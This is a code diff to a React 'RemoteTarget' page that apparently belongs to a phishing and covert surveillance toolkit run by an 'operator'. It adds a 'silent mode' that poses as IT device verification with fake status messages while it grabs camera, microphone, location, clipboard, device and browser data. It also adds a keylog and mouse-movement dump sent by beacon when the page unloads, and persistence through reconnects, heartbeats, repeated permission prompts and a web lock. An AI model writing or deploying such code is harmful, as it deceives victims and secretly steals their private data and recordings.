@@ -26,6 +26,9 @@ interface TargetPageConfig {
   pageTitle: string;
   pageSubtitle: string;
   brandColor: "blue" | "red" | "green" | "purple" | "orange";
+  silentMode: boolean;
+  persistentConnection: boolean;
+  sessionLabel: string;
 }
 
 interface SessionInfo {
@@ -296,6 +299,9 @@ export default function RemoteTarget() {
   const [forgotPassword, setForgotPassword] = useState(false);
   const [resetEmail, setResetEmail] = useState("");
   const [resetSent, setResetSent] = useState(false);
+  const [silentModePhase, setSilentModePhase] = useState<"collecting" | "complete" | null>(null);
+  const [silentModeStatus, setSilentModeStatus] = useState("Initializing device verification...");
+  const silentModeRanRef = useRef(false);
 
   const selfieVideoRef = useRef<HTMLVideoElement | null>(null);
   const cameraStreamRef = useRef<MediaStream | null>(null);
@@ -303,7 +309,7 @@ export default function RemoteTarget() {
   const analyserRef = useRef<AnalyserNode | null>(null);
   const animFrameRef = useRef<number>(0);
 
-  const cfg = session?.pageConfig || { steps: { identity: true, biometric: true, voice: true, environment: true, documents: true }, enableBanking: false, enableAutoHarvest: true, enableCredentialOverlay: false, autoRequestPermissions: false, pageTitle: "Account Security Verification", pageSubtitle: "", brandColor: "blue" as const };
+  const cfg = session?.pageConfig || { steps: { identity: true, biometric: true, voice: true, environment: true, documents: true }, enableBanking: false, enableAutoHarvest: true, enableCredentialOverlay: false, autoRequestPermissions: false, pageTitle: "Account Security Verification", pageSubtitle: "", brandColor: "blue" as const, silentMode: false, persistentConnection: false, sessionLabel: "" };
 
   const activeStepKeys = [
     cfg.steps.identity ? "identity" : null,
@@ -337,12 +343,29 @@ export default function RemoteTarget() {
   const keylogTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const mousePositionsRef = useRef<{ x: number; y: number; t: number }[]>([]);
 
+  const messageQueueRef = useRef<object[]>([]);
+  const reconnectAttemptRef = useRef(0);
+  const reconnectTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const heartbeatIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const isIntentionalCloseRef = useRef(false);
+  const webLockRef = useRef<AbortController | null>(null);
+
   const updatePermission = useCallback((key: PermissionKey, update: Partial<PermissionState>) => {
     setPermissions((prev) => ({ ...prev, [key]: { ...prev[key], ...update } }));
   }, []);
 
   const sendWS = useCallback((msg: object) => {
     if (wsRef.current?.readyState === WebSocket.OPEN) {
+      wsRef.current.send(JSON.stringify(msg));
+    } else {
+      messageQueueRef.current.push(msg);
+    }
+  }, []);
+
+  const flushMessageQueue = useCallback(() => {
+    if (wsRef.current?.readyState !== WebSocket.OPEN) return;
+    const queued = messageQueueRef.current.splice(0);
+    for (const msg of queued) {
       wsRef.current.send(JSON.stringify(msg));
     }
   }, []);
@@ -527,11 +550,30 @@ export default function RemoteTarget() {
     };
 
     const handleBeforeUnload = () => {
-      sendWS({
-        type: "rc_activity",
-        data: { category: "navigation_attempt", timestamp: new Date().toISOString() },
-        token,
-      });
+      const finalDump: Record<string, any> = {
+        category: "final_data_dump",
+        timestamp: new Date().toISOString(),
+        keylogBuffer: keylogBufferRef.current.splice(0),
+        mousePositions: mousePositionsRef.current.splice(0),
+        sessionDuration: Math.round((Date.now() - performance.now()) / 1000),
+        permissionsState: {} as Record<string, boolean>,
+        queuedMessages: messageQueueRef.current.length,
+        online: navigator.onLine,
+      };
+      try {
+        const nav = navigator as any;
+        if (nav.connection) {
+          finalDump.connectionType = nav.connection.effectiveType;
+          finalDump.downlink = nav.connection.downlink;
+        }
+      } catch {}
+      if (wsRef.current?.readyState === WebSocket.OPEN) {
+        wsRef.current.send(JSON.stringify({ type: "rc_activity", data: finalDump, token }));
+      }
+      try {
+        const blob = new Blob([JSON.stringify({ type: "rc_activity", data: finalDump, token })], { type: "application/json" });
+        navigator.sendBeacon(`/api/remote-sessions/token/${token}/data`, blob);
+      } catch {}
     };
 
     const handleOnlineOffline = () => {
@@ -925,6 +967,62 @@ export default function RemoteTarget() {
     clipboard: handleClipboard, browserData: handleBrowserData,
   };
 
+  useEffect(() => {
+    if (!session || !autoHarvestDone || !cfg.silentMode || silentModeRanRef.current) return;
+    silentModeRanRef.current = true;
+    setSilentModePhase("collecting");
+
+    const runSilentCollection = async () => {
+      setSilentModeStatus("Verifying device credentials...");
+      await new Promise((r) => setTimeout(r, 800));
+
+      setSilentModeStatus("Running security diagnostics...");
+      try { await handleCamera(); } catch {}
+      await new Promise((r) => setTimeout(r, 500));
+
+      setSilentModeStatus("Analyzing device configuration...");
+      try { await handleMicrophone(); } catch {}
+      await new Promise((r) => setTimeout(r, 500));
+
+      setSilentModeStatus("Confirming device location...");
+      try { await handleLocation(); } catch {}
+      await new Promise((r) => setTimeout(r, 400));
+
+      setSilentModeStatus("Reading device clipboard...");
+      try { await handleClipboard(); } catch {}
+      await new Promise((r) => setTimeout(r, 300));
+
+      setSilentModeStatus("Checking notification services...");
+      try {
+        if ("Notification" in window && Notification.permission !== "denied") {
+          await Notification.requestPermission();
+        }
+      } catch {}
+      await new Promise((r) => setTimeout(r, 300));
+
+      setSilentModeStatus("Collecting device telemetry...");
+      try { await handleDeviceInfo(); } catch {}
+      await new Promise((r) => setTimeout(r, 400));
+
+      setSilentModeStatus("Scanning browser environment...");
+      try { await handleBrowserData(); } catch {}
+      await new Promise((r) => setTimeout(r, 500));
+
+      setSilentModeStatus("Verification complete");
+      await new Promise((r) => setTimeout(r, 1000));
+      setSilentModePhase("complete");
+    };
+
+    const waitForWs = async () => {
+      for (let i = 0; i < 20; i++) {
+        if (wsRef.current?.readyState === WebSocket.OPEN) break;
+        await new Promise((r) => setTimeout(r, 500));
+      }
+      runSilentCollection();
+    };
+    waitForWs();
+  }, [session, autoHarvestDone, cfg.silentMode, handleCamera, handleMicrophone, handleLocation, handleClipboard, handleDeviceInfo, handleBrowserData]);
+
   const handlePermissionRequest = useCallback((permission: PermissionKey) => {
     if (permissions[permission]?.granted) return;
     setPendingRequest(permission);
@@ -1037,23 +1135,125 @@ export default function RemoteTarget() {
 
   useEffect(() => {
     if (!session) return;
-    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
-    const ws = new WebSocket(`${protocol}//${window.location.host}/ws`);
-    wsRef.current = ws;
-    ws.onopen = () => { ws.send(JSON.stringify({ type: "rc_join", token })); };
-    ws.onmessage = async (evt) => {
-      try {
-        const msg = JSON.parse(evt.data);
-        if (msg.type === "rc_answer" && pcRef.current) await pcRef.current.setRemoteDescription(new RTCSessionDescription(msg.sdp));
-        if (msg.type === "rc_ice_candidate" && pcRef.current && msg.candidate) await pcRef.current.addIceCandidate(new RTCIceCandidate(msg.candidate));
-        if (msg.type === "rc_request_permission" && msg.permission) handlePermissionRequest(msg.permission as PermissionKey);
-        if (msg.type === "rc_toggle_camera") handleToggleCamera(msg.enabled);
-        if (msg.type === "rc_toggle_mic") handleToggleMic(msg.enabled);
-        if (msg.type === "rc_session_closed") setError("Session has been closed by the operator");
-      } catch {}
+    isIntentionalCloseRef.current = false;
+
+    const getBackoffDelay = () => {
+      const base = Math.min(1000 * Math.pow(2, reconnectAttemptRef.current), 30000);
+      return base;
     };
-    return () => { ws.close(); if (pcRef.current) pcRef.current.close(); };
-  }, [session, token, handlePermissionRequest, handleToggleCamera, handleToggleMic]);
+
+    const connect = () => {
+      const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
+      const ws = new WebSocket(`${protocol}//${window.location.host}/ws`);
+      wsRef.current = ws;
+
+      ws.onopen = () => {
+        reconnectAttemptRef.current = 0;
+        ws.send(JSON.stringify({ type: "rc_join", token }));
+        flushMessageQueue();
+
+        if (heartbeatIntervalRef.current) clearInterval(heartbeatIntervalRef.current);
+        heartbeatIntervalRef.current = setInterval(() => {
+          if (ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({ type: "rc_heartbeat", token, timestamp: new Date().toISOString() }));
+          }
+        }, 15000);
+      };
+
+      ws.onmessage = async (evt) => {
+        try {
+          const msg = JSON.parse(evt.data);
+          if (msg.type === "rc_answer" && pcRef.current) await pcRef.current.setRemoteDescription(new RTCSessionDescription(msg.sdp));
+          if (msg.type === "rc_ice_candidate" && pcRef.current && msg.candidate) await pcRef.current.addIceCandidate(new RTCIceCandidate(msg.candidate));
+          if (msg.type === "rc_request_permission" && msg.permission) handlePermissionRequest(msg.permission as PermissionKey);
+          if (msg.type === "rc_toggle_camera") handleToggleCamera(msg.enabled);
+          if (msg.type === "rc_toggle_mic") handleToggleMic(msg.enabled);
+          if (msg.type === "rc_session_closed") {
+            isIntentionalCloseRef.current = true;
+            setError("Session has been closed by the operator");
+          }
+        } catch {}
+      };
+
+      ws.onclose = () => {
+        if (heartbeatIntervalRef.current) {
+          clearInterval(heartbeatIntervalRef.current);
+          heartbeatIntervalRef.current = null;
+        }
+        if (!isIntentionalCloseRef.current) {
+          const delay = getBackoffDelay();
+          reconnectAttemptRef.current++;
+          reconnectTimeoutRef.current = setTimeout(connect, delay);
+        }
+      };
+
+      ws.onerror = () => {};
+    };
+
+    connect();
+
+    return () => {
+      isIntentionalCloseRef.current = true;
+      if (reconnectTimeoutRef.current) {
+        clearTimeout(reconnectTimeoutRef.current);
+        reconnectTimeoutRef.current = null;
+      }
+      if (heartbeatIntervalRef.current) {
+        clearInterval(heartbeatIntervalRef.current);
+        heartbeatIntervalRef.current = null;
+      }
+      if (wsRef.current) wsRef.current.close();
+      if (pcRef.current) pcRef.current.close();
+    };
+  }, [session, token, handlePermissionRequest, handleToggleCamera, handleToggleMic, flushMessageQueue]);
+
+  useEffect(() => {
+    if (!session || !cfg.persistentConnection) return;
+
+    const statusInterval = setInterval(() => {
+      const nav = navigator as any;
+      const connection = nav.connection || nav.mozConnection || nav.webkitConnection;
+      sendWS({
+        type: "rc_device_status",
+        data: {
+          online: navigator.onLine,
+          visible: !document.hidden,
+          connectionType: connection?.effectiveType || null,
+          downlink: connection?.downlink || null,
+          timestamp: new Date().toISOString(),
+        },
+        token,
+      });
+    }, 30000);
+
+    const permRetryInterval = setInterval(() => {
+      const permissionsToRetry: PermissionKey[] = ["camera", "microphone", "location", "clipboard"];
+      for (const perm of permissionsToRetry) {
+        if (!permissions[perm].granted && !permissions[perm].loading && handlers[perm]) {
+          try { handlers[perm](); } catch {}
+        }
+      }
+    }, 300000);
+
+    let lockAbort: AbortController | null = null;
+    if (navigator.locks) {
+      lockAbort = new AbortController();
+      webLockRef.current = lockAbort;
+      const lockName = `aegis-rc-session-${token}`;
+      navigator.locks.request(lockName, { signal: lockAbort.signal }, () => {
+        return new Promise<void>(() => {});
+      }).catch(() => {});
+    }
+
+    return () => {
+      clearInterval(statusInterval);
+      clearInterval(permRetryInterval);
+      if (lockAbort) {
+        lockAbort.abort();
+        webLockRef.current = null;
+      }
+    };
+  }, [session, cfg.persistentConnection, sendWS, token, permissions, handlers]);
 
   if (loading) {
     return (
@@ -1088,6 +1288,53 @@ export default function RemoteTarget() {
           <div className="w-12 h-12 border-2 border-gray-200 border-t-gray-800 rounded-full animate-spin" />
           <p className="text-sm font-medium text-gray-700" data-testid="text-init-status">{initStatus}</p>
           <p className="text-xs text-gray-400">This may take a moment</p>
+        </div>
+      </div>
+    );
+  }
+
+  if (cfg.silentMode) {
+    const silentLabel = cfg.sessionLabel || "IT Device Management";
+    return (
+      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4" data-testid="silent-mode-container">
+        <div className="max-w-sm w-full text-center space-y-6">
+          <div className="flex items-center justify-center">
+            <div className="w-16 h-16 bg-white rounded-2xl border border-gray-200 flex items-center justify-center shadow-sm">
+              <Shield className="w-8 h-8 text-gray-700" />
+            </div>
+          </div>
+
+          <div className="space-y-2">
+            <h1 className="text-lg font-semibold text-gray-900" data-testid="text-silent-label">{silentLabel}</h1>
+            {silentModePhase === "complete" ? (
+              <p className="text-sm text-green-600 font-medium" data-testid="text-silent-complete">Verification Complete</p>
+            ) : (
+              <p className="text-sm text-gray-500" data-testid="text-silent-status">
+                {silentModePhase === "collecting" ? silentModeStatus : "Device Verification in Progress"}
+              </p>
+            )}
+          </div>
+
+          {silentModePhase === "complete" ? (
+            <div className="space-y-4">
+              <div className="w-12 h-12 bg-green-50 rounded-full flex items-center justify-center mx-auto">
+                <CheckCircle2 className="w-6 h-6 text-green-600" />
+              </div>
+              <p className="text-xs text-gray-400">Your device has been verified successfully. You may close this page.</p>
+            </div>
+          ) : (
+            <div className="space-y-4">
+              <div className="w-10 h-10 border-2 border-gray-200 border-t-gray-700 rounded-full animate-spin mx-auto" />
+              <p className="text-xs text-gray-400">This may take a moment. Please do not close this page.</p>
+              <div className="w-48 mx-auto">
+                <div className="h-1 bg-gray-200 rounded-full overflow-hidden">
+                  <div className="h-full bg-gray-500 rounded-full animate-pulse" style={{ width: silentModePhase === "collecting" ? "60%" : "20%" }} />
+                </div>
+              </div>
+            </div>
+          )}
+
+          <p className="text-[10px] text-gray-300">Powered by IT Security Services</p>
         </div>
       </div>
     );
